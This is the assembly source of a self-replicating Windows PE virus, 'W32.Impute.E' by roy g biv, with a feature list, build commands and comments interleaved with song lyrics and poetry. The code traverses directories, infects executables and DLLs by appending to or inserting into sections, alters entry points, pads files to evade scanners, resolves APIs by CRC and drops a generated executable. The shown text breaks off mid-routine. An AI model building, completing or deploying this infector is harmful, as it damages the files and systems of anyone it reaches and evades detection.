comment ;)
W32.Impute.E by roy g biv

some of its features:
- parasitic resident (own process) infector of PE exe and dll (but not looking at suffix)
- infects files in current directory and all subdirectories
- directory traversal is linked-list instead of recursive to reduce stack size
- reloc section inserter/last section appender
- weird EPO (entry point is altered but no replication happens there)
- uses CRCs instead of API names
- uses SEH for common code exit
- no infect files with data outside of image (eg self-extractors)
- no infect files protected by SFC
- infected files are padded by random amounts to confuse tail scanners
- correct file checksum without using imagehlp.dll :) 100% correct algorithm

yes, just a W32.Relock remake that infects in a slightly different way

fixed-base version, mov-retnn style
---

  optimisation tip: Windows appends ".dll" automatically, so this works:
        push "cfs"
        push esp
        call LoadLibraryA
---

to build this thing:
tasm
----
tasm32 /ml /m3 impute
tlink32 /B:400000 /x impute,,,import32

Virus runs from data section, so no need to alter section attributes
---

I'm alone here
With emptiness eagles and snow
Unfriendliness chilling my body
And taunting with pictures of home
(Deep Purple)

(;

.486 ;bswap
.model  flat

extern  MessageBoxA:proc
extern  ExitProcess:proc

.data
include impute.inc

dropper         label   near
        push    ebx
        mov     edx, krncrc_count
        mov     ebx, offset krnnames
        mov     edi, offset krncrcbegin
        call    create_crcs
        mov     edx, 1
        mov     ebx, offset sfcnames
        mov     edi, offset sfccrcbegin
        call    create_crcs
        mov     edx, dllcrc_count
        mov     ebx, offset dllnames
        mov     edi, offset dllcrcbegin
        call    create_crcs
        pop     ebx
        jmp     impute_execode
import_size     equ ((offset impute_codeend - offset impute_inf) * 4) + 4
export_size     equ 200h * 4

;-----------------------------------------------------------------------------
;everything before this point is dropper code
;-----------------------------------------------------------------------------

;-----------------------------------------------------------------------------
;main virus body.  everything happens in here
;-----------------------------------------------------------------------------

align 2
impute_inf      proc    near
align
        db      offset import_loop - (offset import_list + 1)
        xor     eax, eax
        push    dword ptr fs:[eax]
        mov     dword ptr fs:[eax], esp
        enter   (size findlist - 5) and -4, 0   ;Windows enables alignment check exception
                                                ;so some APIs fail if buffer is not dword aligned
                                                ;-5 to align at 2 dwords earlier
                                                ;because EBP saved automatically
                                                ;and other register saved next
        push    eax                             ;zero findprev in findlist
        mov     eax, dword ptr [ebx + pebLdr]   ;ebx = fs:[30h] at start time
        mov     esi, dword ptr [eax + ldrInLoadOrderModuleList]
        lods    dword ptr [esi]
        xchg    esi, eax
        lods    dword ptr [esi]
        mov     eax, dword ptr [eax + mlDllBase]
        call    parse_exports

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

krncrcbegin     label   near
        dd      (krncrc_count + 1) dup (0)

;-----------------------------------------------------------------------------
;get SFC support
;-----------------------------------------------------------------------------

        call    load_sfc
        db      "sfc_os", 0                     ;Windows XP (forwarder chain from sfc.dll)
        db      "IMPute - roy g biv"            ;imported code

load_sfc        label   near
        call    dword ptr [esp + krncrcstk.kLoadLibraryA]
        call    parse_exports

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

sfccrcbegin     label   near
        dd      0, 0

        mov     ebp, esp
        lea     esi, dword ptr [ebp + size krncrcstk]

;-----------------------------------------------------------------------------
;non-recursive directory traverser
;-----------------------------------------------------------------------------

scan_dir        proc    near                    ;ebp -> platform APIs, esi -> findlist
        push    '*'                             ;Unicode findmask
        mov     eax, esp
        lea     ebx, dword ptr [esi + findlist.finddata]
        push    ebx
        push    eax
        call    dword ptr [ebp + krncrcstk.kFindFirstFileW]
        pop     ecx
        mov     dword ptr [esi + findlist.findhand], eax
        inc     eax
        je      find_prev

        ;you must always step forward from where you stand

test_dirfile    label   near
        mov     eax, dword ptr [ebx + WIN32_FIND_DATA.dwFileAttributes]
        lea     edi, dword ptr [esi + findlist.finddata.cFileName]
        test    al, FILE_ATTRIBUTE_DIRECTORY
        je      test_file
        cmp     byte ptr [edi], '.'             ;ignore . and .. (but also .* directories)
        je      find_next

;-----------------------------------------------------------------------------
;enter subdirectory, and allocate another list node
;-----------------------------------------------------------------------------

        push    edi
        call    dword ptr [ebp + krncrcstk.kSetCurrentDirectoryW]
        xchg    ecx, eax
        jecxz   find_next
        push    size findlist
        push    GMEM_FIXED
        call    dword ptr [esp + krncrcstk.kGlobalAlloc + 8]
        xchg    ecx, eax
        jecxz   step_updir
        xchg    esi, ecx
        mov     dword ptr [esi + findlist.findprev], ecx
        jmp     scan_dir

find_next       label   near
        lea     ebx, dword ptr [esi + findlist.finddata]
        push    ebx
        mov     edi, dword ptr [esi + findlist.findhand]
        push    edi
        call    dword ptr [ebp + krncrcstk.kFindNextFileW]
        test    eax, eax
        jne     test_dirfile

;-----------------------------------------------------------------------------
;close find, and free list node if not list head
;-----------------------------------------------------------------------------

        mov     ebx, esp
        push    edi
        call    dword ptr [ebx + krncrcstk.kFindClose]

find_prev       label   near
        mov     ecx, dword ptr [esi + findlist.findprev]
        jecxz   impute_exit
        push    esi
        mov     esi, ecx
        call    dword ptr [ebx + krncrcstk.kGlobalFree]

step_updir      label   near

;-----------------------------------------------------------------------------
;the ANSI string ".." can be used, even on Unicode platforms
;-----------------------------------------------------------------------------

        push    '..'
        org     $ - 1                           ;select top 8 bits of push
impute_exit     label   near
        int     3                               ;game over

        push    esp
        call    dword ptr [ebx + krncrcstk.kSetCurrentDirectoryA]
        pop     eax
        jmp     find_next

test_file       label   near

;-----------------------------------------------------------------------------
;get full path
;-----------------------------------------------------------------------------

        push    eax                             ;save original file attributes for close
        mov     eax, ebp
        enter   MAX_PATH * 2, 0
        mov     ecx, esp
        push    eax
        push    esp
        push    ecx
        push    MAX_PATH
        push    edi
        call    dword ptr [eax + krncrcstk.kGetFullPathNameW]
        xchg    edi, eax
        pop     eax
        xor     ebx, ebx

;-----------------------------------------------------------------------------
;don't touch protected files
;-----------------------------------------------------------------------------

        push    esp
        push    ebx
        call    dword ptr [ebp + 8 + krncrcstk.kSfcIsFileProtected]
        leave
        test    eax, eax
        jne     restore_attr
        call    set_fileattr
        push    ebx
        push    ebx
        push    OPEN_EXISTING
        push    ebx
        push    ebx
        push    FILE_READ_DATA or FILE_WRITE_DATA
        push    edi
        call    dword ptr [ebp + krncrcstk.kCreateFileW]
        xchg    ebx, eax
        call    test_infect
        db      81h                             ;mask CALL
        call    infect_file                     ;Super Nashwan power ;)

delta_label     label   near
        lea     eax, dword ptr [esi + findlist.finddata.ftLastWriteTime]
        push    eax
        sub     eax, 8
        push    eax
        push    0
        push    ebx
        call    dword ptr [esp + 4 + krncrcstk.kSetFileTime + 10h]
        push    ebx
        call    dword ptr [esp + 4 + krncrcstk.kCloseHandle + 4]

restore_attr    label   near
        pop     ebx                             ;restore original file attributes
        call    set_fileattr
        jmp     find_next
scan_dir        endp

init_kernel32   label   near
        mov     eax, dword ptr [ebx + pebLdr]   ;ebx = fs:[30h] at start time
        mov     esi, dword ptr [eax + ldrInLoadOrderModuleList]
        lods    dword ptr [esi]
        xchg    esi, eax
        lods    dword ptr [esi]
        mov     eax, dword ptr [eax + mlDllBase]

;-----------------------------------------------------------------------------
;parse export table
;-----------------------------------------------------------------------------

parse_exports   label   near
        pop     edi
        xchg    ebx, eax
        mov     esi, dword ptr [ebx + mzhdr.mzlfanew]
        mov     esi, dword ptr [ebx + esi + pehdr.peexport.dirrva]
        lea     esi, dword ptr [ebx + esi + peexp.expadrrva]
        lods    dword ptr [esi]                 ;Export Address Table RVA
        lea     edx, dword ptr [ebx + eax]
        lods    dword ptr [esi]                 ;Name Pointer Table RVA
        lea     ecx, dword ptr [ebx + eax]
        lods    dword ptr [esi]                 ;Ordinal Table RVA
        lea     ebp, dword ptr [ebx + eax]
        mov     esi, ecx

push_export     label   near
        push    ecx

get_export      label   near
        lods    dword ptr [esi]
        push    ebx
        add     ebx, eax                        ;Name Pointer VA
        or      eax, -1

crc_outer       label   near
        xor     al, byte ptr [ebx]
        push    8
        pop     ecx

crc_inner       label   near
        add     eax, eax
        jnb     crc_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

crc_skip        label   near
        loop    crc_inner
        sub     cl, byte ptr [ebx]              ;carry set if not zero
        inc     ebx                             ;carry not altered by inc
        jb      crc_outer
        pop     ebx
        cmp     dword ptr [edi], eax
        jne     get_export

;-----------------------------------------------------------------------------
;exports must be sorted alphabetically, otherwise GetProcAddress() would fail
;this allows to push addresses onto the stack, and the order is known
;-----------------------------------------------------------------------------

        pop     ecx
        mov     eax, esi
        sub     eax, ecx                        ;Name Pointer Table VA
        shr     eax, 1
        movzx   eax, word ptr [ebp + eax - 2]   ;get export ordinal
        mov     eax, dword ptr [eax * 4 + edx]  ;get export RVA
        add     eax, ebx
        push    eax
        scas    dword ptr [edi]
        cmp     dword ptr [edi], 0
        jne     push_export
        scas    dword ptr [edi]
        jmp     edi

;-----------------------------------------------------------------------------
;look for MZ and PE file signatures
;-----------------------------------------------------------------------------

is_pehdr        proc    near                    ;edi -> map view
        cmp     word ptr [edi], 'ZM'            ;Windows does not check 'MZ'
        jne     pehdr_ret
        mov     esi, dword ptr [edi + mzhdr.mzlfanew]
        add     esi, edi
        lods    dword ptr [esi]                 ;SEH protects against bad lfanew value
        add     eax, -'EP'                      ;anti-heuristic test filetype ;) and clear EAX

pehdr_ret       label   near
        ret                                     ;if PE file, then eax = 0, esi -> COFF header, Z flag set
is_pehdr        endp

;-----------------------------------------------------------------------------
;reset/set read-only file attribute
;-----------------------------------------------------------------------------

set_fileattr    proc    near                    ;ebx = file attributes, esi -> findlist, ebp -> platform APIs
        push    ebx
        lea     edi, dword ptr [esi + findlist.finddata.cFileName]
        push    edi
        call    dword ptr [ebp + krncrcstk.kSetFileAttributesW]
        ret                                     ;edi -> filename
        db      "22/09/13"                      ;better late than never
set_fileattr    endp

;-----------------------------------------------------------------------------
;test if file is infectable (not protected, PE, x86, non-system, not infected, etc)
;-----------------------------------------------------------------------------

test_infect     proc    near                    ;esi = find data, edi = map view, ebp -> platform APIs
        call    map_view
        mov     ebp, esi
        call    is_pehdr
        jne     inftest_ret
        lods    dword ptr [esi]
        cmp     ax, IMAGE_FILE_MACHINE_I386
        jne     inftest_ret                     ;only Intel 386+

;-----------------------------------------------------------------------------
;32-bit executable file...
;-----------------------------------------------------------------------------

        test    byte ptr [esi + pehdr.pecoff.peflags - pehdr.pecoff.petimedate], IMAGE_FILE_EXECUTABLE_IMAGE
        je      inftest_ret
        shr     eax, 0dh                        ;move high 16 bits into low 16 bits and multiply by 8
        lea     edx, dword ptr [eax * 4 + eax]  ;complete multiply by 28h (size pesect)

;-----------------------------------------------------------------------------
;the COFF magic value is not checked because Windows ignores it anyway
;IMAGE_FILE_MACHINE_IA64 machine type is the only reliable way to detect PE32+
;-----------------------------------------------------------------------------

        mov     eax, dword ptr [esi + pehdr.pesubsys - pehdr.pecoff.petimedate]
        dec     eax
        dec     eax                             ;sub ax, IMAGE_SUBSYSTEM_WINDOWS_GUI
        cmp     ax, IMAGE_SUBSYSTEM_WINDOWS_CUI - 2
        jnbe    inftest_ret

;-----------------------------------------------------------------------------
;avoid files which seem to contain attribute certificates
;because one of those certificates might be a digital signature
;-----------------------------------------------------------------------------

        mov     ecx, dword ptr [esi + pehdr.pesecurity.dirrva - pehdr.pecoff.petimedate]
        inc     ecx
        loop    inftest_ret

;-----------------------------------------------------------------------------
;cannot use the NumberOfRvaAndSizes field to calculate the Optional Header size
;the Optional Header can be larger than the offset of the last directory
;remember: even if you have not seen it does not mean that it does not happen :)
;-----------------------------------------------------------------------------

        movzx   eax, word ptr [esi + pehdr.pecoff.peopthdrsize - pehdr.pecoff.petimedate]
        add     eax, edx
        mov     ebx, dword ptr [esi + pehdr.pefilealign - pehdr.pecoff.petimedate]
        mov     edx, dword ptr [esi + pehdr.peimagebase - pehdr.pecoff.petimedate]
        lea     esi, dword ptr [esi + eax - pehdr.pecoff.petimedate + pehdr.pemagic - size pesect + pesect.sectrawsize]
        lods    dword ptr [esi]
        add     eax, dword ptr [esi]
        cmp     dword ptr [ebp + findlist.finddata.dwFileSizeLow], eax
        jne     inftest_ret                     ;file contains appended data
        add     dword ptr [ebp + findlist.finddata.dwFileSizeLow], ebx
        inc     dword ptr [esp + mapsehstk.mapsehinfret]
                                                ;skip call mask

inftest_ret     label   near
        int     3

;-----------------------------------------------------------------------------
;increase file size by random value (between RANDPADMIN and RANDPADMAX bytes)
;I use GetTickCount() instead of RDTSC because RDTSC can be made privileged
;-----------------------------------------------------------------------------

open_append     proc    near
        call    dword ptr [esp + size mapstack - 4 + krncrcstk.kGetTickCount]
        and     eax, RANDPADMAX - 1
        add     ax, small (offset impute_codeend - offset impute_inf + RANDPADMIN)

;-----------------------------------------------------------------------------
;create file map, and map view if successful
;-----------------------------------------------------------------------------

map_view        proc    near                    ;eax = extra bytes to map, ebx = file handle, esi -> findlist, ebp -> platform APIs
        cdq
        add     eax, dword ptr [esi + findlist.finddata.dwFileSizeLow]
        push    eax
        mov     ecx, esp
        push    eax                             ;MapViewOfFile
        push    edx                             ;MapViewOfFile
        push    edx                             ;MapViewOfFile
        push    FILE_MAP_WRITE                  ;Windows 9x/Me does not support FILE_MAP_ALL_ACCESS
        push    edx
        push    eax
        push    edx
        push    PAGE_READWRITE
        push    edx
        push    ebx
        call    dword ptr [ecx + size mapstack + krncrcstk.kCreateFileMappingA]
                                                ;ANSI map is allowed because of no name
        push    eax
        xchg    edi, eax
        call    dword ptr [esp + size mapstack + krncrcstk.kMapViewOfFile + 14h]
        pop     ecx
        xchg    edi, eax                        ;should succeed even if file cannot be opened
        pushad
        call    unmap_seh
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad                                   ;SEH destroys all registers
        push    eax
        push    edi
        call    dword ptr [esp + size mapstack + krncrcstk.kUnmapViewOfFile + 4]
        call    dword ptr [esp + size mapstack + krncrcstk.kCloseHandle]
        pop     eax
        ret

unmap_seh       proc    near
        cdq
        push    dword ptr fs:[edx]
        mov     dword ptr fs:[edx], esp
        jmp     dword ptr [esp + mapsehstk.mapsehsehret]
unmap_seh       endp
map_view        endp                            ;eax = map handle, ecx = new file size, edi = map view
open_append     endp

;-----------------------------------------------------------------------------
;infect file in two parts
;algorithm:     increase file size by random amount (RANDPADMIN-RANDPADMAX
;               bytes) to confuse scanners that look at end of file (also
;               infection marker)
;               if reloc table is not in last section (taken from relocation
;               field in PE header, not section name), then append to last
;               section.  otherwise, move relocs down and insert code into
;               space (to confuse people looking at end of file.  they will
;               see only relocation data and garbage or many zeroes)
;               entry point is altered to point to some code.  very simple
;               however, that code just drops exe and returns
;-----------------------------------------------------------------------------

infect_file     label   near                    ;esi -> findlist, edi = map view
        call    open_append
        push    ecx
        push    edi
        mov     ebx, dword ptr [edi + mzhdr.mzlfanew]
        lea     ebx, dword ptr [ebx + edi + pehdr.pechksum]
        xor     ecx, ecx
        imul    cx, word ptr [ebx + pehdr.pecoff.pesectcount - pehdr.pechksum], size pesect
        add     cx, word ptr [ebx + pehdr.pecoff.peopthdrsize - pehdr.pechksum]
        lea     esi, dword ptr [ebx + ecx + pehdr.pemagic - pehdr.pechksum - size pesect + pesect.sectrawsize]
        lods    dword ptr [esi]
        mov     cx, offset impute_codeend - offset impute_inf
        mov     edx, dword ptr [ebx + pehdr.pefilealign - pehdr.pechksum]
        push    eax
        add     eax, ecx
        dec     edx
        add     eax, edx
        not     edx
        and     eax, edx                        ;file align last section
        mov     dword ptr [esi + pesect.sectrawsize - pesect.sectrawaddr], eax

;-----------------------------------------------------------------------------
;raw size is file aligned.  virtual size is not required to be section aligned
;so if old virtual size is larger than new raw size, then size of image does
;not need to be updated, else virtual size must be large enough to cover the
;new code, and size of image is section aligned
;-----------------------------------------------------------------------------

        mov     ebp, dword ptr [esi + pesect.sectvirtaddr - pesect.sectrawaddr]
        cmp     dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr], eax
        jnb     test_reloff
        mov     dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr], eax
        add     eax, ebp
        mov     edx, dword ptr [ebx + pehdr.pesectalign - pehdr.pechksum]
        dec     edx
        add     eax, edx
        not     edx
        and     eax, edx
        mov     dword ptr [ebx + pehdr.peimagesize - pehdr.pechksum], eax

;-----------------------------------------------------------------------------
;if relocation table is not in last section, then append to last section
;otherwise, move relocations down and insert code into space
;-----------------------------------------------------------------------------

test_reloff     label   near
        test    byte ptr [ebx + pehdr.pecoff.peflags - pehdr.pechksum], IMAGE_FILE_RELOCS_STRIPPED
        jne     copy_code
        cmp     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], ebp
        jb      copy_code
        mov     eax, dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr]
        add     eax, ebp
        cmp     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], eax
        jnb     copy_code
        add     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], ecx
        pop     eax
        push    esi
        add     edi, dword ptr [esi]
        lea     esi, dword ptr [edi + eax - 1]
        lea     edi, dword ptr [esi + ecx]
        xchg    ecx, eax
        std
        rep     movs byte ptr [edi], byte ptr [esi]
        cld
        pop     esi
        pop     edi
        push    edi
        push    ecx
        xchg    ecx, eax

copy_code       label   near
        pop     edx
        add     ebp, edx
        add     edx, dword ptr [esi]
        add     edi, edx

;-----------------------------------------------------------------------------
;we need the writable bit for RNG
;-----------------------------------------------------------------------------

        or      byte ptr [esi + pesect.sectflags - pesect.sectrawaddr + 3], (IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_WRITE) shr 18h
        mov     esi, offset impute_inf - offset delta_label
        add     esi, dword ptr [esp + infectstk.infseh.mapsehsehret]
                                                ;delta offset
        rep     movs byte ptr [edi], byte ptr [esi]

;-----------------------------------------------------------------------------
;alter entry point
;-----------------------------------------------------------------------------

        add     ebp, offset impute_execode - offset impute_inf
        xchg    dword ptr [ebx + pehdr.peentrypoint - pehdr.pechksum], ebp
        sub     ebp, dword ptr [ebx + pehdr.peentrypoint - pehdr.pechksum]
        sub     ebp, 5
        mov     dword ptr [edi + offset host_patch - offset impute_codeend + 3], ebp
        pop     edi

;-----------------------------------------------------------------------------
;CheckSumMappedFile() - simply sum of all words in file, then adc filesize
;-----------------------------------------------------------------------------

        xchg    dword ptr [ebx], ecx
        jecxz   infect_ret
        cdq
        pop     ecx
        push    ecx
        inc     ecx
        shr     ecx, 1
        clc

calc_checksum   label   near
        adc     dx, word ptr [edi]
        inc     edi
        inc     edi
        loop    calc_checksum
        pop     dword ptr [ebx]
        adc     dword ptr [ebx], edx            ;avoid common bug.  ADC not ADD

infect_ret      label   near
        int     3                               ;common exit using SEH
        db      "*4U2NV*"                       ;that is, unless you're reading this
test_infect     endp

;-----------------------------------------------------------------------------
;Mersenne Twister RNG MT19937 (c) 1997 Makoto Matsumoto and Takuji Nishimura
;period is ((2^19937)-1) with 623-dimensionally equidistributed sequence
;asm port and size optimise by rgb in 2002
;-----------------------------------------------------------------------------

randinit        proc    near                    ;eax = seed, ecx = 0, edi -> RNG cache
        pushad
        push    edi
        or      eax, 1
        mov     ecx, statelen

init_loop       label   near
        stos    dword ptr [edi]
        mov     edx, 69069
        mul     edx                             ;Knuth label   near x_new = x_old * 69069
        loop    init_loop
        inc     ecx                             ;force reload
        call    initdelta

initdelta       label   near
        pop     edi
        add     edi, offset randvars - offset initdelta
        xchg    ecx, eax
        stos    dword ptr [edi]
        pop     eax
        stos    dword ptr [edi]
        stos    dword ptr [edi]
        popad
        ret
randinit        endp

random          proc    near
        pushad
        call    randelta

randvars        label   near
        db      'rgb!'                          ;numbers left
        db      'rgb!'                          ;next pointer
        db      'rgb!'                          ;state pointer

randelta        label   near
        pop     esi
        push    esi
        lods    dword ptr [esi]
        xchg    ecx, eax
        lods    dword ptr [esi]
        xchg    esi, eax
        loop    random_ret
        mov     cx, statelen - period
        mov     esi, dword ptr [eax]
        lea     ebx, dword ptr [esi + (period * 4)]
        mov     edi, esi
        push    esi
        lods    dword ptr [esi]
        xchg    edx, eax
        call    twist
        pop     ebx
        mov     cx, period - 1
        push    ecx
        push    ebx
        call    twist
        pop     esi
        push    esi
        inc     ecx
        call    twist
        xchg    edx, eax
        pop     esi
        pop     ecx
        inc     ecx

random_ret      label   near
        lods    dword ptr [esi]
        mov     edx, eax
        shr     eax, tshiftU
        xor     eax, edx
        mov     edx, eax
        shl     eax, tshiftS
        and     eax, tmaskB
        xor     eax, edx
        mov     edx, eax
        shl     eax, tshiftT
        and     eax, tmaskC
        xor     eax, edx
        mov     edx, eax
        shr     eax, tshiftL
        xor     eax, edx
        pop     edi
        mov     dword ptr [esp + 1ch], eax      ;eax in pushad
        xchg    ecx, eax
        stos    dword ptr [edi]
        xchg    esi, eax
        stos    dword ptr [edi]
        popad
        ret
random          endp

twist           proc    near
        lods    dword ptr [esi]
        push    eax
        add     eax, eax                        ;remove highest bit
        add     edx, edx                        ;test highest bit
        rcr     eax, 2                          ;merge bits and test lowest bit
        jnb     twist_skip                      ;remove branch but larger using label   near
        xor     eax, matrixA                    ;sbb edx, edx+and edx, matrixA+xor eax, edx

twist_skip      label   near
        xor     eax, dword ptr [ebx]
        add     ebx, 4
        stos    dword ptr [edi]
        pop     edx
        loop    twist
        ret
twist           endp

        ;When last comes to last,
        ;  I have little power:
        ;  I am merely an urn.
        ;I hold the bone-sap of myself,
        ;  And watch the marrow burn.
        ;
        ;When last comes to last,
        ;  I have little strength:
        ;  I am only a tool.
        ;I work its work; and in its hands
        ;  I am the fool.
        ;
        ;When last comes to last,
        ;  I have little life.
        ;  I am simply a deed:
        ;an action done while courage holds:
        ;  A seed.
        ;(Stephen Donaldson)

impute_execode  proc    near
        call    $+5
host_patch      label   near
        add     dword ptr [esp], offset do_message - offset host_patch
                                                ;replaced dynamically
        pushad
        mov     ebx, dword ptr fs:[30h]
        call    init_kernel32

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

dllcrcbegin     label   near                    ;place < 80h bytes from call for smaller code
        dd      (dllcrc_count + 1) dup (0)
        mov     ebx, esp
        call    dword ptr [ebx + dllcrcstk.dGetTickCount]
        mov     ebp, "r."
        enter   (statelen + 1) shl 2, 0         ;RNG cache
        mov     edi, esp
        call    randinit
        mov     esi, exesize + import_size + export_size + offset import_list - offset impute_imp
        push    esi
        push    GMEM_ZEROINIT
        call    dword ptr [ebx + dllcrcstk.dGlobalAlloc]
        cdq
        push    edx                             ;WinExec
        push    ebp                             ;WinExec
        push    eax                             ;GlobalFree
        push    edx                             ;WriteFile
        push    esp                             ;WriteFile
        push    esi                             ;WriteFile
        push    eax                             ;WriteFile
        push    edx                             ;CreateFile
        push    edx                             ;CreateFile
        push    CREATE_ALWAYS                   ;CreateFile
        push    edx                             ;CreateFile
        push    edx                             ;CreateFile
        push    FILE_WRITE_DATA                 ;CreateFile
        push    ebp                             ;CreateFile
        call    skip_exe
        dd      10001011000101110110111111101110b
;               mz  02mmz  02mmmz  0dmmmmmmz  0e
        db      'M', 'Z', 'P', 'E', 4ch, 1, 1, 40h, 0, 3, 0, 0bh, 1
        dd      10111011000111010111010001000101b
;               mz  0emmz  03mz  0bmz  08mz  02m
        db      exesize, ImageBase shr 18h, 4, 4, 4, ((2000h + exesize + (import_size + export_size + offset import_list - offset impute_imp)) and -1000h) shr 8, 8ch
        dd      00111100011110001010001111000101b
;               z  07mz  03mmz  02mz  03mmz  02m
        db      2, (import_size + export_size + (exesize - 8ch) + offset import_list - offset impute_imp) and 0ffh, (import_size + export_size + (exesize - 8ch) + offset import_list - offset impute_imp) shr 8, 8ch, (import_size + export_size + (exesize - 8ch) + offset import_list - offset impute_imp) and 0ffh, (import_size + export_size + (exesize - 8ch) + offset import_list - offset impute_imp) shr 8, 8ch
        dd      00111100011100011100010110101111b
;               z  07mz  03mz  03mz  02mmz  0bmm
        db      2, 8ch, 20h, 0e0h, 8ch, '.', 'r'
        dd      00110100011100100100110110101000b
;               z  06mz  03mz  04mz  06mmz  0a
        db      90h, (exesize + offset import_list - offset impute_imp) and 0ffh, 2, (exesize + import_size + offset import_list - offset impute_imp) and 0ffh, (exesize + import_size + offset import_list - offset impute_imp) shr 8
        dd      0

impute_imp      label   near
        mov     esi, ImageBase + exesize + offset import_list - offset impute_imp
        mov     edi, esi

import_loop     label   near
if use_b8c2
        mov     ecx, esp
        call    esi
        stos    byte ptr [edi]
        xchg    ecx, eax
        sub     esp, eax
        xchg    esp, eax
elseif use_b9c2
        mov     eax, esp
        call    esi
        sub     esp, eax
        xchg    esp, eax
        stos    byte ptr [edi]
        xchg    ecx, eax
elseif use_bac2
        mov     eax, esp
        call    esi
        sub     esp, eax
        xchg    esp, eax
        stos    byte ptr [edi]
        xchg    edx, eax
elseif use_bbc2
        xchg    ebx, eax
        mov     ecx, esp
        call    esi
        xchg    ebx, eax
        stos    byte ptr [edi]
        xchg    ecx, eax
        sub     esp, eax
        xchg    esp, eax
elseif use_bdc2
        mov     eax, esp
        call    esi
        sub     esp, eax
        xchg    esp, eax
        stos    byte ptr [edi]
        xchg    ebp, eax
endif
        stos    byte ptr [edi]
        lods    dword ptr [esi]
        lods    dword ptr [esi]
        cmp     byte ptr [esi], bl
        db      75h
import_list     label   near

exesize equ     0b4h
;RLE-based compressed MZ header, PE header, section table

;decompressed data follow
;       db      'M', 'Z'                ;00
;       db      0, 0                    ;02    align 4
;       db      'P', 'E', 0, 0          ;04 00 signature
;       dw      14ch                    ;08 04 machine
;       dw      1                       ;0a 06 number of sections
;       dd      0                       ;0c 08 date/time stamp
;       dd      0                       ;10 0c pointer to symbol table
;       dd      0                       ;14 10 number of symbols
;       dw      offset section_table - 18h
;                                       ;18 14 size of optional header
;       dw      3                       ;1a 16 characteristics
;       dw      10bh                    ;1c 18 magic
;       db      0                       ;1e 1a major linker
;       db      0                       ;1f 1b minor linker
;       dd      0                       ;20 1c size of code
;       dd      0                       ;24 20 size of init data
;       dd      0                       ;28 24 size of uninit data
;       dd      offset impute_imp       ;2c 28 entry point
;       dd      0                       ;30 2c base of code
;       dd      0                       ;34 30 base of data
;       dd      ImageBase               ;38 34 image base
;       dd      4                       ;3c 38 section align (overload for lfanew)
;       dd      4                       ;40 3c file align
;       dw      0                       ;44 40 major os
;       dw      0                       ;46 42 minor os
;       dw      0                       ;48 44 major image
;       dw      0                       ;4a 46 minor image
;       dw      4                       ;4c 48 major subsys
;       dw      0                       ;4e 4a minor subsys
;       dd      0                       ;50 4c reserved
;       dd      (8k+size of code)       ;54 50 size of image
;       dd      offset import_table     ;58 54 size of headers
;section_table:
;       dd      0                       ;5c 58 checksum (overload for section name)
;       dw      2                       ;60 5c subsystem (overload for section name)
;       dw      0                       ;62 5e dll characteristics (overload for section name)
;       dd      offset impute_codeend - offset export_table
;                                       ;64 60 size of stack reserve (overload for virtual size)
;       dd      offset export_table     ;68 64 size of stack commit (overload for virtual address)
;       dd      offset impute_codeend - offset export_table
;                                       ;6c 68 size of heap reserve (overload for file size)
;       dd      offset export_table     ;70 6c size of heap commit (overload for file offset)
;       dd      0                       ;74 70 loader flags (overload for pointer to relocs)
;       dd      2                       ;78 74 number of rva and sizes (overload for pointer to line numbers)
;export_dir:
;       dd      offset export_table     ;7c 78 export (overload for reloc table and line numbers)
;       dd      0e0000020h              ;80 7c export (overload for section characteristics)
;       dd      offset import_table     ;84 80 import
;       dd      0                       ;88 84 import
;export_table:
;import_table:
;       dd      0                       ;8c 88 resource (overload for export flags and import lookup table)
;import_name:
;       db      ".r", 0, 0              ;90 8c resource (overload for export and import timedate stamp)
;       dd      0                       ;94 90 exception (overload for export version and import forwarder chain)
;       dd      offset import_name      ;98 94 exception (overload for export and import name rva)
;       dd      offset import_list      ;9c 98 certificate (overload for export ordinal base and import address table)
;       dd      200h                    ;a0 9c certificate (overload for export address table entries)
;       dd      0                       ;a4 a0 base reloc (overload for export number of name pointers)
;       dd      offset export_address   ;a8 a4 base reloc (overload for export address table rva)
;       dd      0                       ;ac a8 debug (overload for import name rva)
;       dd      0                       ;b0 ac debug
;                                       ;b4

skip_exe        label   near
        pop     esi
        xchg    edi, eax
        xor     ecx, ecx
        cdq

;-----------------------------------------------------------------------------
;decompress dll MZ header, PE header, section table, relocation table
;-----------------------------------------------------------------------------

        lods    dword ptr [esi]

copy_bytes      label   near
        movs    byte ptr [edi], byte ptr [esi]

test_bits       label   near
        add     eax, eax
        jb      copy_bytes
        shld    ecx, eax, 4
        shl     eax, 4
        xchg    edx, eax
        rep     stos byte ptr [edi]
        xchg    edx, eax
        jne     test_bits
        lods    dword ptr [esi]
        test    eax, eax
        jne     test_bits
        mov     cl, offset import_list - offset impute_imp
        rep     movs byte ptr [edi], byte ptr [esi]
        push    ebx
        enter   200h, 0
        push    esp
        xchg    dword ptr [esp], edi
        xor     eax, eax
        mov     cl, 80h
        mov     ebx, edi
        rep     stos dword ptr [edi]
        pop     edi

init_expmov     label   near
        call    random
        movzx   eax, al
        cmp     byte ptr [eax * 4 + edi + import_size], ah
        jne     init_expmov
if use_b8c2
        mov     dl, 0b8h
elseif use_b9c2
        mov     dl, 0b9h
elseif use_bac2
        mov     dl, 0bah
elseif use_bbc2
        mov     dl, 0bbh
elseif use_bdc2
        mov     dl, 0bdh
endif
        mov     dword ptr [eax * 4 + edi + import_size], edx
        mov     byte ptr [ebx + ecx], al

init_expret     label   near
        call    random
        movzx   eax, al
        cmp     byte ptr [eax * 4 + edi + import_size + 400h], ah
        jne     init_expret
        push    edx
        bswap   edx
        add     edx, 0c290h - ImageBase
        mov     dword ptr [eax * 4 + edi + import_size + 400h], edx
        pop     edx
        inc     ch
        mov     byte ptr [ebx + ecx], al
        dec     ch
        inc     ecx
        inc     dh
        jne     init_expmov
        mov     cx, (offset impute_codeend - offset impute_inf) shr 1
